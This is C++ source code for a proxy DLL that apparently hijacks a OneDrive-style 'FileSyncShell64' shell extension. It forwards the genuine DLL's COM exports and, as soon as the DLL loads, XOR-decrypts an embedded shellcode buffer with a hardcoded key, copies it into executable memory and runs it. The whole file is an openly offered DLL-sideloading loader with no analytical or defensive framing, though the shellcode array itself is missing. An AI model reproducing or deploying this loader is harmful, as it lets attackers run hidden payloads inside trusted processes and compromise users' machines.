#include <windows.h>
#include <stdio.h>

// Define function pointers for the original DLL's exported functions
typedef HRESULT (__stdcall *pDllCanUnloadNow)();
typedef HRESULT (__stdcall *pDllGetClassObject)(REFCLSID, REFIID, LPVOID*);
typedef HRESULT (__stdcall *pDllRegisterServer)();
typedef HRESULT (__stdcall *pDllUnregisterServer)();

// Original DLL function pointers
pDllCanUnloadNow OriginalDllCanUnloadNow;
pDllGetClassObject OriginalDllGetClassObject;
pDllRegisterServer OriginalDllRegisterServer;
pDllUnregisterServer OriginalDllUnregisterServer;

HMODULE originalDll;

// Shellcode decryption function
char* xor_encrypt_decrypt(char* data, int data_len, char* key, int key_len) {
    char* output = (char*)malloc(data_len);
    for (int i = 0; i < data_len; ++i) {
        output[i] = data[i] ^ key[i % key_len];
    }
    return output;
}

// Load the original DLL and resolve function addresses
BOOL LoadOriginalDll() {
    originalDll = LoadLibraryA("OriginalFileSyncShell64.dll");
    if (!originalDll) {
        return FALSE;
    }

    OriginalDllCanUnloadNow = (pDllCanUnloadNow)GetProcAddress(originalDll, "DllCanUnloadNow");
    OriginalDllGetClassObject = (pDllGetClassObject)GetProcAddress(originalDll, "DllGetClassObject");
    OriginalDllRegisterServer = (pDllRegisterServer)GetProcAddress(originalDll, "DllRegisterServer");
    OriginalDllUnregisterServer = (pDllUnregisterServer)GetProcAddress(originalDll, "DllUnregisterServer");

    if (!OriginalDllCanUnloadNow || !OriginalDllGetClassObject || !OriginalDllRegisterServer || !OriginalDllUnregisterServer) {
        return FALSE;
    }

    return TRUE;
}

// Exported functions that forward calls to the original DLL
extern "C" __declspec(dllexport) HRESULT __stdcall DllCanUnloadNow() {
    return OriginalDllCanUnloadNow();
}

extern "C" __declspec(dllexport) HRESULT __stdcall DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID* ppv) {
    return OriginalDllGetClassObject(rclsid, riid, ppv);
}

extern "C" __declspec(dllexport) HRESULT __stdcall DllRegisterServer() {
    return OriginalDllRegisterServer();
}

extern "C" __declspec(dllexport) HRESULT __stdcall DllUnregisterServer() {
    return OriginalDllUnregisterServer();
}

// Shellcode execution
void ExecuteShellcode() {
    // Encryption key
    char key[] = {0x57, 0x69, 0x6C, 0x64, 0x50, 0x68, 0x6F, 0x65, 0x6E, 0x69, 0x78, 0x31, 0x32, 0x33, 0x34, 0x35, 0x00};

    // Decrypt the shellcode
    char* decrypted_shellcode = xor_encrypt_decrypt(shellcode_bin, shellcode_bin_len, key, sizeof(key) - 1);

    // Allocate memory for the decrypted shellcode
    LPVOID addressPointer = VirtualAlloc(NULL, shellcode_bin_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (addressPointer) {
        // Copy decrypted shellcode to the allocated memory
        memcpy(addressPointer, decrypted_shellcode, shellcode_bin_len);

        // Execute the shellcode
        ((void(*)())addressPointer)();

        free(decrypted_shellcode);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            if (!LoadOriginalDll()) {
                return FALSE;
            }
            ExecuteShellcode(); // Execute the shellcode when the DLL is loaded
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            if (originalDll) {
                FreeLibrary(originalDll);
            }
            break;
    }
    return TRUE;
}

